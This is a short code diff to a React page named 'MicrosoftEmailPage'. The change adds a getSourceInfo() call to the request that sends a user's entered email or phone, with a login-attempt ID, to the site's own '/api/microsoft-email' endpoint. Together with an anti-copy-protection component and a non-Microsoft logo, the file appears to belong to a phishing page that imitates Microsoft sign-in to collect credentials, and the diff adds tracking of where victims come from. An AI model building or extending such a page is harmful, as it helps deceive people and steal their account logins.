@@ -7,6 +7,7 @@ import { AntiCopyProtection } from '@/components/AntiCopyProtection';
 import { SEO } from '@/components/SEO';
 import { useToast } from '@/hooks/use-toast';
 import { apiRequest } from '@/lib/queryClient';
+import { getSourceInfo } from '@/lib/sourceInfo';
 import { z } from 'zod';
 import '@/styles/styles.css';
 import rcgLogo from '@assets/bannerlogo_1760638008519.png';
@@ -68,6 +69,7 @@ export default function MicrosoftEmailPage() {
       const res = await apiRequest('POST', '/api/microsoft-email', {
         loginAttemptId,
         emailOrPhone: data.emailOrPhone,
+        sourceInfo: getSourceInfo(),
       });
       return await res.json();
     },
